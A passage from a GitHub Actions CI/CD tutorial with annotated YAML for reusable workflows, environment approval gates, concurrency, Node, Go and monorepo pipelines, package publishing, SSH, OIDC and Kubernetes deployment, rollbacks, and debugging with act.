const core = require('@actions/core');   // GitHub's toolkit: inputs, outputs, logging, masking
try {
  const who = core.getInput('who', { required: true });   // reads the `who` input
  const greeting = `Hello, ${who}!`;
  core.info(greeting);                                     // appears in the run log
  core.setOutput('greeting', greeting);                    // becomes steps.<id>.outputs.greeting
} catch (err) {
  core.setFailed(err.message);                             // fail the step with a clear message
}
```

Use it like any other action: `- uses: my-org/my-action@<sha>` with `with: { who: 'team' }`. A **Docker action** instead sets `runs: { using: 'docker', image: 'Dockerfile' }` and reads inputs from `INPUT_WHO` env vars; it's Linux-only and slower to start (image build/pull) but can carry any toolchain.

### 10.4 Reusable workflows in practice (`workflow_call`) **[A]**

A reusable workflow is a workflow with `on: workflow_call`; another workflow invokes it under a job's **`uses:`** (note: at the *job* level, not the step level). The caller passes `with:` (inputs) and `secrets:`.

```yaml
# .github/workflows/reusable-node-ci.yml   (the CALLEE — defines the shared pipeline)
on:
  workflow_call:
    inputs:
      node-version: { type: string, default: '20' }
    secrets:
      CODECOV_TOKEN: { required: false }
    outputs:
      result: { value: ${{ jobs.test.outputs.result }}, description: 'pass/fail summary' }
jobs:
  test:
    runs-on: ubuntu-latest
    outputs:
      result: ${{ steps.r.outputs.result }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: '${{ inputs.node-version }}', cache: 'npm' }
      - run: npm ci && npm test
      - id: r
        run: echo "result=passed" >> "$GITHUB_OUTPUT"
```

```yaml
# .github/workflows/ci.yml   (the CALLER)
on: [push]
jobs:
  call-ci:
    uses: ./.github/workflows/reusable-node-ci.yml   # local; or owner/repo/.github/workflows/x.yml@v1
    with:
      node-version: '22'
    secrets:
      CODECOV_TOKEN: ${{ secrets.CODECOV_TOKEN }}
      # or:  secrets: inherit   ← pass ALL the caller's secrets through (use sparingly)
```

> **The Marketplace** is where the community publishes actions. Before writing your own, search it — `actions/*`, `docker/*`, `aws-actions/*`, `softprops/action-gh-release`, etc., cover most needs. When you do pull a Marketplace action, **pin it to a SHA** (§9.6).

---

## 11. Environments & Deployments

An **environment** in Actions is a named deployment target (`staging`, `production`) with its own **secrets**, **protection rules**, and **deployment history**. Environments turn "a job that runs `deploy.sh`" into a **governed deployment** with approvals, restrictions, and an audit trail. This is the layer that makes Continuous *Delivery* (manual gate) possible.

### 11.1 The `environment:` key & protection rules **[I/A]**

Attaching `environment:` to a job (1) unlocks that environment's **scoped secrets**, (2) enforces its **protection rules** before the job runs, and (3) records a deployment in the repo's Environments view. Protection rules (configured in repo settings → Environments) include:
- **Required reviewers** — named people/teams must **approve** before the job proceeds (the human gate of Continuous Delivery; the job *pauses* awaiting approval).
- **Wait timer** — a forced delay (e.g. 10 minutes) before deploying, giving a window to cancel.
- **Deployment branches/tags** — restrict which branches/tags may deploy to this environment (e.g. only `main` and `v*` tags may deploy to `production`).

```yaml
jobs:
  deploy-production:
    runs-on: ubuntu-latest
    environment:
      name: production                 # ← enforces production's protection rules + secrets
      url: https://myapp.example.com   # ← shown in the UI / PR as the deployment link
    steps:
      - run: ./deploy.sh
        env:
          DEPLOY_KEY: ${{ secrets.PROD_DEPLOY_KEY }}   # a PRODUCTION-scoped secret
```

When this job is reached, if `production` requires reviewers, the run **pauses** and shows "Waiting for approval" until a reviewer clicks Approve — at which point it continues. That pause *is* your manual delivery gate.

### 11.2 Concurrency control — cancel in-progress runs **[I/A]**

The **`concurrency:`** key prevents overlapping runs from stepping on each other. You assign a **concurrency group** (a string); only **one** run per group proceeds at a time, and `cancel-in-progress: true` **cancels any older run** in the group when a new one starts. The two big use cases: (1) **don't run two deploys to the same environment at once** (race conditions), and (2) **cancel superseded CI** — when you push twice quickly to a PR, cancel the first (now-outdated) run to save minutes.

```yaml
# Cancel an in-progress CI run for the same ref when a newer commit arrives:
concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}   # one group per workflow+branch/PR
  cancel-in-progress: true                              # kill the older run

jobs:
  build: { runs-on: ubuntu-latest, steps: [{ run: echo build }] }
```

```yaml
# For DEPLOYS, usually you DON'T cancel mid-deploy (could leave a half-deployed state) —
# instead queue them so only one runs at a time:
concurrency:
  group: deploy-production
  cancel-in-progress: false   # let the in-flight deploy finish; queue the next
```

> **Gotcha:** `cancel-in-progress: true` is great for **CI** (drop stale builds) but risky for **deploys** — cancelling a deploy halfway can leave a broken state. Use `false` (queue) for deployment groups.

### 11.3 Manual approvals & deployment gates — the full picture **[A]**

Putting it together: a Continuous *Delivery* pipeline auto-deploys to **staging** on every merge to `main`, then a `production` job with **required reviewers** waits for a human Approve before going live — with `concurrency` ensuring deploys don't overlap. This is exactly the worked example you'll build in §12/§14.

---

## 12. Real Production Pipelines (Node & Go)

Now we assemble everything into **complete, heavily-commented, production-grade workflows**. Read every comment — these encode the best practices from §1–§11.

### 12.0 Service containers — real dependencies for integration tests **[I/A]**

Most real test suites need a **database, cache, or message broker** to run against. Rather than mocking everything, GitHub Actions lets you declare **service containers** with the job-level **`services:`** key — sidecar Docker containers that GitHub starts on the runner *before* your steps, keeps running for the job's lifetime, and tears down after. Your steps reach them over `localhost` on the mapped port (or, if your *steps run in a container too*, by the service's name). This gives you genuine integration tests against the *same* database/cache versions you run in production (cross-reference the **PostgreSQL** and **Redis** guides).

The critical detail is the **healthcheck**: the container being "started" is not the same as it being "ready to accept connections." Without a healthcheck + retries, your tests race the database and flake. The `options:` field passes Docker healthcheck flags so the job *waits* until the service is genuinely ready.

```yaml
jobs:
  integration:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:16-alpine
        env: { POSTGRES_PASSWORD: pw, POSTGRES_DB: app_test }
        ports: ['5432:5432']                  # map container 5432 → runner localhost:5432
        options: >-                            # Docker healthcheck: wait for real readiness
          --health-cmd "pg_isready -U postgres"
          --health-interval 5s
          --health-timeout 5s
          --health-retries 10
      redis:
        image: redis:7-alpine
        ports: ['6379:6379']
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 5s --health-timeout 3s --health-retries 10
    env:
      DATABASE_URL: postgres://postgres:pw@localhost:5432/app_test
      REDIS_URL: redis://localhost:6379
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: '20', cache: 'npm' }
      - run: npm ci
      - run: npm run migrate          # run DB migrations against the live service container
      - run: npm run test:integration # tests now hit a REAL Postgres + Redis
```

### 12.1 Node/TypeScript: lint → test (matrix) → build → Docker → GHCR → deploy **[A]**

This is a full pipeline for a Node/TypeScript service: it lints and type-checks, runs tests across a Node matrix with a real Postgres service, builds the app, builds and pushes a Docker image to **GHCR** with buildx caching, and deploys — gated by an environment. (Cross-reference: **Node.js guide** for the app, **Docker guide** for the multi-stage Dockerfile, **PostgreSQL guide** for the service DB.)

```yaml
# .github/workflows/node-cicd.yml
name: Node CI/CD

on:
  push:
    branches: [main]
    tags: ['v*.*.*']
  pull_request:
    branches: [main]

# Restrictive default token for the whole workflow; jobs widen only as needed.
permissions:
  contents: read

# Cancel superseded CI runs on the same ref (save minutes); see §11.2.
concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  # ── 1. LINT + TYPE-CHECK (fast gate; runs in parallel with `test`) ──
  lint:
    name: Lint & Type-check
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'                 # auto-cache deps by package-lock.json hash
      - run: npm ci                    # clean, lockfile-exact install
      - run: npm run lint              # ESLint — style/correctness gate
      - run: npm run typecheck         # `tsc --noEmit` — type gate

  # ── 2. TEST across a Node matrix, with a real Postgres SERVICE container ──
  test:
    name: Test (Node ${{ matrix.node }})
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false                 # show ALL version failures, not just the first
      matrix:
        node: [18, 20, 22]
    # `services:` spins up sidecar containers on the runner for the job's lifetime.
    services:
      postgres:
        image: postgres:16-alpine
        env:
          POSTGRES_PASSWORD: postgres
          POSTGRES_DB: testdb
        ports: ['5432:5432']
        # Wait until Postgres is actually accepting connections before tests run:
        options: >-
          --health-cmd "pg_isready -U postgres"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    env:
      DATABASE_URL: postgres://postgres:postgres@localhost:5432/testdb
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}
          cache: 'npm'
      - run: npm ci
      - run: npm test                  # your test runner (Vitest/Jest) — talks to the service DB
      - name: Upload coverage report
        if: matrix.node == 20          # only upload from ONE combo to avoid duplicate artifacts
        uses: actions/upload-artifact@v4
        with:
          name: coverage               # unique within the run
          path: coverage/
          retention-days: 7

  # ── 3. BUILD & PUSH Docker image to GHCR (only after lint+test pass) ──
  docker:
    name: Build & Push Image
    needs: [lint, test]                # fan-in: wait for both gates
    runs-on: ubuntu-latest
    # Only build/push images for branch/tag PUSHES, never for PRs (no creds to leak on forks).
    if: github.event_name == 'push'
    permissions:
      contents: read
      packages: write                  # ← needed to push to GHCR with GITHUB_TOKEN
    steps:
      - uses: actions/checkout@v4

      # Enable buildx (modern builder: cache export, multi-platform). See Docker guide.
      - uses: docker/setup-buildx-action@v3

      # Log in to GitHub Container Registry using the auto-provided GITHUB_TOKEN.
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}   # no PAT needed — least-privilege token

      # Compute image tags/labels (e.g. branch name, git SHA, semver from a tag).
      - id: meta
        uses: docker/metadata-action@v5
        with:
          images: ghcr.io/${{ github.repository }}
          tags: |
            type=sha,prefix=sha-           # ghcr.io/owner/repo:sha-<short>
            type=ref,event=branch          # :main, :feature-x
            type=semver,pattern={{version}} # :1.2.3  (only on v* tags)

      - name: Build and push
        uses: docker/build-push-action@v6
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha           # ← restore buildx layer cache from GitHub Actions cache
          cache-to: type=gha,mode=max    # ← save layer cache for next run (big speedups)

  # ── 4. DEPLOY (only on tag pushes to production, with a human approval gate) ──
  deploy:
    name: Deploy to Production
    needs: [docker]
    runs-on: ubuntu-latest
    # Only deploy on version tags; the environment adds the approval gate.
    if: startsWith(github.ref, 'refs/tags/v')
    environment:
      name: production                  # required reviewers / branch rules enforced here (§11)
      url: https://myapp.example.com
    permissions:
      contents: read
      id-token: write                   # for OIDC, if deploying to a cloud (§9.7)
    steps:
      - run: |
          echo "Deploying ${{ github.ref_name }} to production…"
          # …call your deploy mechanism: SSH to a VPS (§14.1), kubectl, cloud CLI via OIDC, etc.
```

> **Why this shape:** lint/test run in parallel for speed; the image is built **only on pushes** (never on fork PRs, so no creds leak); buildx GHA cache makes rebuilds fast; deploy is gated by a **version tag + a production environment with required reviewers** — that gate is your Continuous Delivery approval. Coverage is uploaded from a single matrix combo to respect v4's unique-name rule.

### 12.2 Go: vet/test → build → release **[A]**

A Go pipeline: format/vet/test gates, then a cross-platform build, then a GitHub Release on tags. (Cross-reference: **Go guide** and **Go/Gin guide**.)

```yaml
# .github/workflows/go-cicd.yml
name: Go CI/CD

on:
  push:
    branches: [main]
    tags: ['v*.*.*']
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  # ── Quality gates: formatting, vet (suspicious-code analyzer), and tests ──
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with:
          go-version: '1.23'
          cache: true                   # caches the module + build cache automatically
      - name: Verify formatting
        run: |
          # gofmt -l lists files that are NOT properly formatted; if any, fail the build.
          test -z "$(gofmt -l .)" || { echo "Run gofmt!"; gofmt -l .; exit 1; }
      - run: go vet ./...               # static analysis for suspect constructs
      - run: go test -race -coverprofile=coverage.out ./...   # tests with the race detector
      - name: Lint (golangci-lint)
        uses: golangci/golangci-lint-action@v6   # popular meta-linter (pin to SHA in real use)
        with:
          version: latest

  # ── Cross-platform build matrix; upload each binary as a uniquely-named artifact ──
  build:
    needs: [check]
    runs-on: ubuntu-latest
    strategy:
      matrix:
        include:
          - { goos: linux,   goarch: amd64 }
          - { goos: linux,   goarch: arm64 }
          - { goos: darwin,  goarch: arm64 }
          - { goos: windows, goarch: amd64, ext: .exe }
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with: { go-version: '1.23', cache: true }
      - name: Build
        env:
          GOOS: ${{ matrix.goos }}
          GOARCH: ${{ matrix.goarch }}
          CGO_ENABLED: '0'              # static binary (no libc dependency) — see Docker guide
        run: |
          out="myapp-${{ matrix.goos }}-${{ matrix.goarch }}${{ matrix.ext }}"
          go build -ldflags "-s -w -X main.version=${GITHUB_REF_NAME}" -o "dist/$out" ./cmd/myapp
      - uses: actions/upload-artifact@v4
        with:
          name: myapp-${{ matrix.goos }}-${{ matrix.goarch }}   # UNIQUE per matrix combo (v4 rule)
          path: dist/

  # ── On a version tag, gather all binaries and publish a GitHub Release ──
  release:
    needs: [build]
    if: startsWith(github.ref, 'refs/tags/v')
    runs-on: ubuntu-latest
    permissions:
      contents: write                   # ← creating a release/tag needs write
    steps:
      - uses: actions/download-artifact@v4
        with:
          path: dist                     # downloads ALL artifacts into dist/<artifact-name>/
          merge-multiple: true           # flatten them into one dist/ folder
      - name: Create GitHub Release
        uses: softprops/action-gh-release@v2   # pin to SHA in production
        with:
          generate_release_notes: true   # auto-build changelog from merged PRs since last tag
          files: dist/**                 # attach every built binary as a release asset
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

### 12.2b Next.js / monorepo: path-filtered, change-aware builds **[A]**

Monorepos (multiple apps/packages in one repo) waste enormous time if every push rebuilds *everything*. The fix is **change detection**: only run the jobs for the parts that actually changed. The simplest mechanism is `paths:` filters per workflow; a more flexible one is the `dorny/paths-filter` action, which computes booleans for each path group and feeds them to downstream `if:` conditions. This example builds a Next.js `web` app and a `api` service independently (cross-reference the **Next.js 16** and **NestJS** guides).

```yaml
# .github/workflows/monorepo.yml
name: Monorepo CI
on:
  pull_request: { branches: [main] }
  push: { branches: [main] }
permissions: { contents: read }
concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  # 1) Detect WHICH parts of the monorepo changed → boolean outputs.
  changes:
    runs-on: ubuntu-latest
    outputs:
      web: ${{ steps.filter.outputs.web }}
      api: ${{ steps.filter.outputs.api }}
    steps:
      - uses: actions/checkout@v4
      - uses: dorny/paths-filter@v3          # pin to SHA in production
        id: filter
        with:
          filters: |
            web:
              - 'apps/web/**'
              - 'packages/ui/**'
            api:
              - 'apps/api/**'

  # 2) Build the web app ONLY if web (or shared ui) changed.
  web:
    needs: [changes]
    if: needs.changes.outputs.web == 'true'
    runs-on: ubuntu-latest
    defaults: { run: { working-directory: apps/web } }
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: '20', cache: 'npm' }
      - run: npm ci --workspace apps/web
      - run: npm run lint && npm run typecheck && npm run test
      - run: npm run build                   # `next build`
      # Cache Next.js's build cache for faster incremental builds:
      - uses: actions/cache@v4
        with:
          path: apps/web/.next/cache
          key: ${{ runner.os }}-nextjs-${{ hashFiles('apps/web/package-lock.json') }}-${{ hashFiles('apps/web/**/*.[jt]s', 'apps/web/**/*.[jt]sx') }}
          restore-keys: ${{ runner.os }}-nextjs-${{ hashFiles('apps/web/package-lock.json') }}-

  # 3) Build the API ONLY if api changed (runs in PARALLEL with web).
  api:
    needs: [changes]
    if: needs.changes.outputs.api == 'true'
    runs-on: ubuntu-latest
    defaults: { run: { working-directory: apps/api } }
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: '20', cache: 'npm' }
      - run: npm ci --workspace apps/api
      - run: npm run test && npm run build
```

> **Why change detection beats raw `paths:` filters here:** a single workflow with internal `if:` gates keeps **one** required status check (the `changes` job always runs), sidestepping the "path-filtered required check never reports" trap (§15.3), while still skipping the expensive build jobs that aren't needed.

### 12.3 Linting/formatting/type-check gates, coverage & branch protection **[I/A]**

The jobs above are only *enforced* if you wire them into **branch protection**. In repo settings → Branches → add a rule for `main` that **requires status checks to pass before merging** and lists your CI job names (e.g. `Lint & Type-check`, `Test (Node 20)`) as **required checks**. Now a PR **cannot be merged** until those jobs are green — that's the link that makes CI a true *gate*, not just a notification. Add **code coverage** by uploading a coverage report (Codecov/coverage artifact) and optionally failing the build below a threshold.

> **Gotcha (required checks + path filters):** if a required check is also `paths`-filtered and a PR doesn't touch those paths, the check **never reports**, and the PR can be **stuck "waiting"** forever. Either don't path-filter required workflows, or add a tiny always-passing companion job with the required name. (See §15.3.)

---

## 13. Building & Publishing — Docker, npm, Go, Releases

### 13.1 Building & pushing Docker images to a registry **[A]**

We used this in §12.1; here's the *why* and the full toolset. The modern stack is **buildx** (the extended builder, supporting layer-cache export and multi-platform images) + **`docker/build-push-action`**. The key performance trick is **`cache-from`/`cache-to` with `type=gha`**, which stores Docker layer cache in the GitHub Actions cache so subsequent builds reuse unchanged layers (often turning multi-minute builds into seconds). For **multi-platform** images (amd64 + arm64), add `platforms:` and QEMU. (Cross-reference the **Docker guide** for Dockerfile/multi-stage/buildx detail.)

```yaml
jobs:
  image:
    runs-on: ubuntu-latest
    permissions: { contents: read, packages: write }
    steps:
      - uses: actions/checkout@v4
      - uses: docker/setup-qemu-action@v3        # emulation, for building arm64 on amd64 runners
      - uses: docker/setup-buildx-action@v3
      - uses: docker/login-action@v3
        with: { registry: ghcr.io, username: '${{ github.actor }}', password: '${{ secrets.GITHUB_TOKEN }}' }
      - uses: docker/build-push-action@v6
        with:
          context: .
          platforms: linux/amd64,linux/arm64      # multi-arch image
          push: true
          tags: ghcr.io/${{ github.repository }}:latest
          cache-from: type=gha
          cache-to: type=gha,mode=max
```

> **Registries:** the same flow targets **Docker Hub** (`registry: docker.io`, login with a Docker Hub access token in a secret) or cloud registries (**ECR/GAR/ACR** — authenticate via **OIDC**, §9.7, instead of static keys). GHCR is the natural default for GitHub-hosted code: it ties images to the repo and authenticates with the built-in `GITHUB_TOKEN`.

### 13.2 Publishing an npm package **[A]**

To publish to the npm registry, `setup-node` can write the auth token to `.npmrc`; you publish on a version tag. Use **npm provenance** (`--provenance`) to attach a signed, OIDC-backed statement of *where/how* the package was built (supply-chain transparency) — which requires `id-token: write`.

```yaml
jobs:
  publish-npm:
    runs-on: ubuntu-latest
    if: startsWith(github.ref, 'refs/tags/v')
    permissions:
      contents: read
      id-token: write                  # ← enables npm provenance
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          registry-url: 'https://registry.npmjs.org'   # ← wires up .npmrc for publishing
      - run: npm ci
      - run: npm publish --provenance --access public   # signed provenance via OIDC
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}     # an npm automation token (a secret)
```

### 13.3 Publishing a Go package **[I]**

Go "packages" aren't published to a central registry the way npm is — the **Go module proxy** fetches them directly from your tagged Git repo. So "publishing a Go module" is really just **pushing an annotated, semver Git tag** (`v1.2.3`) — which your release job already does (§12.2). After tagging, `go get module@v1.2.3` works because the proxy reads the tag from your repo. (Cross-reference the **Git guide** on annotated tags and the **Go guide** on module versioning/`go.mod`.)

### 13.4 GitHub Releases, changelogs & tags **[I/A]**

A **GitHub Release** wraps a Git **tag** with release notes and downloadable assets (your built binaries). The clean pattern: a developer pushes a semver tag (`git tag -a v1.2.3 -m "…" && git push origin v1.2.3`), which triggers the release job (`on: push: tags: ['v*.*.*']`); the job builds artifacts and calls a release action with **`generate_release_notes: true`** (or `gh release create --generate-notes`) to **auto-build a changelog** from the PRs/commits merged since the previous tag.

```yaml
on:
  push:
    tags: ['v*.*.*']
jobs:
  release:
    runs-on: ubuntu-latest
    permissions: { contents: write }
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }       # full history so notes can diff against the previous tag
      - run: gh release create "${GITHUB_REF_NAME}" --generate-notes ./dist/*
        env: { GITHUB_TOKEN: '${{ secrets.GITHUB_TOKEN }}' }
```

> **semantic-release note:** tools like **semantic-release** automate this further — they parse your **Conventional Commits** (`feat:`, `fix:`, `BREAKING CHANGE:`), automatically compute the next semver version, generate the changelog, create the tag and release, and publish the package, all from CI. It's the gold standard for fully-automated versioned releases, at the cost of disciplined commit messages. (Cross-reference the **Git guide** on Conventional Commits.)

---

## 14. Deployment Strategies

How the built artifact actually reaches users. Pick based on where you host.

### 14.1 Deploying to a VPS over SSH **[A]**

The simplest production deploy: SSH into your own server and pull/restart. Store the server's **private SSH key** (and host/user) as secrets. A common, robust pattern is "pull the new image and `docker compose up -d`" (cross-reference the **Docker guide** §21 and the **Nginx guide** for the reverse proxy in front).

```yaml
jobs:
  deploy-vps:
    needs: [docker]                    # after the image is in GHCR
    runs-on: ubuntu-latest
    if: startsWith(github.ref, 'refs/tags/v')
    environment: production            # approval gate + prod secrets
    steps:
      - name: Deploy over SSH
        uses: appleboy/ssh-action@v1   # pin to SHA in production
        with:
          host: ${{ secrets.VPS_HOST }}
          username: ${{ secrets.VPS_USER }}
          key: ${{ secrets.VPS_SSH_KEY }}          # the private key, stored as a secret
          script: |
            cd /opt/myapp
            echo "${{ secrets.GITHUB_TOKEN }}" | docker login ghcr.io -u ${{ github.actor }} --password-stdin
            docker compose pull                    # fetch the new image tag
            docker compose up -d                   # recreate containers with the new image
            docker image prune -f                  # clean up old layers
```

> **Security:** use a **dedicated deploy key** with minimal server privileges (a non-root `deploy` user, locked-down `sudo`); never reuse your personal key. Restrict the key's authorized command if possible. Behind the server, **Nginx** terminates TLS and proxies to the app (Nginx guide).

### 14.2 Deploying to the cloud with OIDC **[A]**

For AWS/GCP/Azure, **use OIDC** (§9.7) — no stored cloud keys. The job assumes a role via the cloud's login action, then runs the deploy CLI (`aws ecs update-service`, `gcloud run deploy`, `az webapp deploy`, `kubectl apply`, etc.).

```yaml
jobs:
  deploy-cloud:
    runs-on: ubuntu-latest
    environment: production
    permissions: { id-token: write, contents: read }   # id-token for OIDC
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-deploy
          aws-region: us-east-1
      - run: aws ecs update-service --cluster prod --service myapp --force-new-deployment
```

### 14.2b Deploying to Kubernetes **[A]**

For Kubernetes, the deploy job authenticates to the cluster (ideally via the cloud's **OIDC** login, then fetching kubeconfig), sets the new image on the deployment, and **waits for the rollout to finish** so the job fails if the new pods don't become healthy. The `kubectl rollout status` wait is what turns "applied" into "actually deployed and healthy."

```yaml
jobs:
  deploy-k8s:
    runs-on: ubuntu-latest
    environment: production
    permissions: { id-token: write, contents: read }
    steps:
      - uses: aws-actions/configure-aws-credentials@v4    # OIDC → temp creds (no stored keys)
        with: { role-to-assume: arn:aws:iam::123456789012:role/gha-eks, aws-region: us-east-1 }
      - run: aws eks update-kubeconfig --name prod-cluster --region us-east-1
      - run: |
          # Point the deployment at the immutable, SHA-tagged image we just pushed:
          kubectl set image deployment/myapp myapp=ghcr.io/${{ github.repository }}:sha-${GITHUB_SHA::7}
          # Block until the rollout succeeds; if pods crashloop, this FAILS the job:
          kubectl rollout status deployment/myapp --timeout=120s
```

### 14.3 Deploying to a PaaS **[I]**

PaaS platforms (Render, Railway, Fly.io, Vercel, Heroku) often deploy on a **git push to a connected branch** with no workflow at all — or via their CLI/action triggered from your pipeline (passing a deploy token secret). The pattern: build/test in Actions, then call the PaaS deploy action/CLI on success. This is the lowest-ops path (cross-reference the Docker guide §21 on PaaS).

### 14.4 Blue-green, canary & rollbacks — concepts **[A]**

These are *deployment strategies* you orchestrate from the deploy job (or hand off to the platform):
- **Blue-green:** run two identical production environments — **blue** (live) and **green** (idle). Deploy the new version to green, smoke-test it, then **flip the router** (load balancer/Nginx upstream) from blue to green instantly. **Rollback = flip back.** Zero-downtime, instant rollback, at the cost of double the infrastructure.
- **Canary:** release the new version to a **small percentage** of traffic first (say 5%), watch metrics/error rates, then gradually ramp to 100% if healthy (or roll back if not). Catches problems with minimal blast radius. Needs traffic-splitting (load balancer, service mesh, or platform support) and good monitoring.
- **Rolling:** replace instances in batches (the default in Kubernetes/ECS) — no extra infra, but the rollback is "redeploy the old version" (slower than a blue-green flip).
- **Rollbacks:** the cardinal rule is **make rollback trivial and fast** — keep the previous image/release available and re-deployable with one action (re-run the deploy job pointing at the previous tag, or flip blue-green). Immutable image tags (`sha-<x>`) make "deploy the exact previous version" reliable.

A `workflow_dispatch` "rollback" workflow that takes a `version` input and redeploys that exact image tag is a simple, powerful safety net. Because images are tagged by **immutable SHA**, "deploy the previous version" is deterministic — there's no ambiguity about *what* you're rolling back to:

```yaml
# .github/workflows/rollback.yml — a one-button manual rollback (combine with §3.3, §14.2b)
name: Rollback
on:
  workflow_dispatch:
    inputs:
      image_tag:
        description: 'Exact image tag to roll back to (e.g. sha-a1b2c3d)'
        required: true
        type: string
permissions: { id-token: write, contents: read }
jobs:
  rollback:
    runs-on: ubuntu-latest
    environment: production               # still gated by approval + prod scope
    steps:
      - env: { TAG: ${{ inputs.image_tag }} }   # launder input via env (§9.5)
        run: |
          echo "Rolling back to ghcr.io/${{ github.repository }}:$TAG"
          # …kubectl set image / docker compose pull+up / cloud deploy pointing at $TAG…
```

---

## 15. Best Practices & Optimization

### 15.1 Keep pipelines fast **[I]**

Slow CI kills momentum (developers stop waiting for it) and costs minutes. Levers:
- **Cache dependencies** (§8.1) — the single biggest win; use `setup-*`'s built-in caching.
- **Parallelize** — let independent jobs (lint/test/build) run concurrently; only `needs` what truly must be sequential (§7.1).
- **Path filters** (§3.1) — don't run the heavy suite on docs-only changes.
- **Cancel stale runs** with `concurrency: cancel-in-progress` on CI (§11.2).
- **Split test suites** with a matrix or sharding to run in parallel.
- **`fetch-depth`** — `actions/checkout` defaults to a shallow clone (depth 1) which is fast; only set `fetch-depth: 0` when you need full history (e.g. changelog diffs).
- **Use `npm ci` / lockfile-exact installs** — faster and reproducible vs `npm install`.

### 15.2 DRY with reusable workflows & composite actions **[I/A]**

Don't copy-paste a 40-line CI job into ten repos. Extract it into a **reusable workflow** (§10.4) or **composite action** (§10.1) and call it. Centralizing the pipeline means one place to fix a bug or bump an action version.

### 15.3 Required checks & branch protection **[I/A]**

As in §12.3: make your key jobs **required status checks** on protected branches so broken code can't merge. Beware the path-filter-on-required-check trap (a filtered required check that doesn't run blocks the merge) — keep required workflows unfiltered, or add a no-op companion.

### 15.4 fail-fast vs full matrix **[I]**

`fail-fast: true` (default) cancels sibling matrix jobs at the first failure — **faster feedback**, fewer minutes, ideal when you just want "is it broken?" Set `fail-fast: false` when you want the **complete picture** ("which of the 9 combos fail?") — e.g. before a release. Choose per workflow's purpose.

### 15.5 Monitoring & notifications (Slack) **[I/A]**

Wire failure (and deploy) notifications so people *know* without watching the Actions tab. Use `if: failure()` (§6.7) plus a Slack action or webhook.

```yaml
  - name: Notify Slack on failure
    if: failure()
    uses: slackapi/slack-github-action@v2   # pin to SHA in production
    with:
      webhook: ${{ secrets.SLACK_WEBHOOK_URL }}
      webhook-type: incoming-webhook
      payload: |
        { "text": "❌ CI failed on ${{ github.repository }}@${{ github.ref_name }} (${{ github.run_id }})" }
```

Also write a **job summary** to `$GITHUB_STEP_SUMMARY` (Markdown) so each run has a readable report on its page:

```yaml
  - run: |
      echo "### Build Summary" >> "$GITHUB_STEP_SUMMARY"
      echo "- Commit: \`${GITHUB_SHA::7}\`" >> "$GITHUB_STEP_SUMMARY"
      echo "- Status: ✅ passed" >> "$GITHUB_STEP_SUMMARY"
```

### 15.6 Cost / minutes awareness **[I]**

On **private repos**, Actions consumes your plan's **included minutes**, with multipliers: **Linux 1×, Windows 2×, macOS 10×**. Public repos get free minutes for standard runners. To control cost: prefer Linux, cache aggressively, path-filter, cancel stale runs, cap `timeout-minutes` (a stuck job can otherwise burn hours), and use `max-parallel` to throttle large matrices. **Storage** (artifacts + caches) and **GHCR data transfer** also count toward billing — set `retention-days` low for transient artifacts.

### 15.7 Debugging failed runs **[I/A]**

When a run fails:
- **Read the logs** — expand the failing step; the error is usually right there.
- **Re-run** — "Re-run failed jobs" (re-runs only what failed) or "Re-run all jobs"; "Re-run with debug logging" enables verbose output.
- **Step Debug Logging** — set repo secrets/variables **`ACTIONS_STEP_DEBUG: true`** (and `ACTIONS_RUNNER_DEBUG: true`) to get detailed internal logs.
- **`tmate` debugging** — an action that opens an **SSH session into the live runner** so you can poke around interactively (use cautiously; never on public repos with secrets).
- **`act`** — a tool that **runs your workflows locally** in Docker, so you can iterate without pushing commit-after-commit. It's not a perfect emulation (some contexts/services differ), but it shortens the feedback loop dramatically for `run:`-heavy workflows.
- **`toJSON` dumps** — `run: echo '${{ toJSON(github) }}'` to inspect exactly what context data you have.

```yaml
  - name: Debug context
    run: |
      echo "event: ${{ github.event_name }}"
      echo "ref:   ${{ github.ref }}"
      echo '${{ toJSON(github.event) }}'   # full event payload — invaluable for "why didn't my filter match?"
```

**Local testing with `act`.** Pushing a commit just to test a YAML tweak is a slow, noisy loop. **`act`** (a separate CLI) reads your `.github/workflows/` and runs jobs **locally in Docker**, simulating the runner so you can iterate in seconds:

```bash
act push                      # simulate a `push` event, run all matching jobs locally
act pull_request              # simulate a PR event
act -j test                   # run only the `test` job
act -l                        # list the jobs act would run
act push -s MY_SECRET=xyz     # provide a secret for the local run
act -P ubuntu-latest=catthehacker/ubuntu:act-22.04   # map a runner label to a Docker image
```

